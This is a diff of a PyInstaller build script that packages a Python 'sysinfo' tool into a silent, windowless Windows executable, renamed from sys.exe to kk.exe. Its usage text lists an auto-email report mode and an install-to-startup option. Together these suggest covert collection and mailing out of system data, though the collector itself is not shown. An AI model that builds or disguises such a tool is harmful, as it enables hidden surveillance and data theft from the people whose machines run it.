@@ -1,6 +1,6 @@
 """
 Build Script - Converts sysinfo.py into a standalone Windows EXE
-Uses PyInstaller to create a single-file executable.
+Uses PyInstaller to create a single-file executable named kk.exe.
 
 Usage:
     python build_exe.py
@@ -26,7 +26,7 @@ def main():
         print("  PyInstaller installed successfully.")
     
     # Step 2: Build the EXE
-    print("\n[2/3] Building EXE (this may take a minute)...")
+    print("\n[2/3] Building kk.exe (this may take a minute)...")
     
     script_dir = os.path.dirname(os.path.abspath(__file__))
     script_path = os.path.join(script_dir, "sysinfo.py")
@@ -35,14 +35,13 @@ def main():
     # --onefile     = Single EXE file
     # --noconsole   = No console window (runs silently in background)
     # --name        = Output EXE name
-    # --icon        = Optional icon (commented out, add your own .ico)
     # --hidden-import = Explicitly include modules that might be missed
     
     cmd = [
         sys.executable, "-m", "PyInstaller",
         "--onefile",
         "--noconsole",
-        "--name", "sys",
+        "--name", "kk",
         "--hidden-import", "win32api",
         "--hidden-import", "win32con",
         "--hidden-import", "win32security",
@@ -65,10 +64,9 @@ def main():
         "--hidden-import", "watchdog.observers",
         "--hidden-import", "watchdog.events",
         "--hidden-import", "winnt",
-        "--hidden-import", "google.auth",
-        "--hidden-import", "google.auth.transport.requests",
         "--hidden-import", "urllib3",
         "--hidden-import", "requests",
+        "--hidden-import", "zipfile",
         "--distpath", os.path.join(script_dir, "dist"),
         "--workpath", os.path.join(script_dir, "build"),
         "--specpath", script_dir,
@@ -82,7 +80,7 @@ def main():
         return
     
     # Step 3: Success
-    exe_path = os.path.join(script_dir, "dist", "sys.exe")
+    exe_path = os.path.join(script_dir, "dist", "kk.exe")
     
     if os.path.exists(exe_path):
         size_mb = os.path.getsize(exe_path) / (1024 * 1024)
@@ -93,15 +91,12 @@ def main():
         print("=" * 60)
         print("\n  HOW TO USE:")
         print("  " + "-" * 45)
-        print(f"  Interactive mode:    {exe_path} --menu")
-        print(f"  Auto email mode:    {exe_path} --auto")
-        print(f"  Auto email alias:   {exe_path} --report")
-        print(f"  Install to startup: {exe_path} --install")
-        print(f"  Remove from startup: {exe_path} --uninstall")
+        print(f"  Interactive mode:    kk.exe --menu")
+        print(f"  Auto email mode:    kk.exe --auto")
+        print(f"  Auto email alias:   kk.exe --report")
+        print(f"  Install to startup: kk.exe --install")
+        print(f"  Remove from startup: kk.exe --uninstall")
         print("  " + "-" * 45)
-        print("\n  IMPORTANT: Before using email, set your Gmail App Password!")
-        print("  Edit GMAIL_APP_PASSWORD in sysinfo.py and rebuild,")
-        print("  or set environment variable: set GMAIL_APP_PASSWORD=xxxx")
     else:
         print(f"\n[-] EXE not found at expected path: {exe_path}")
 
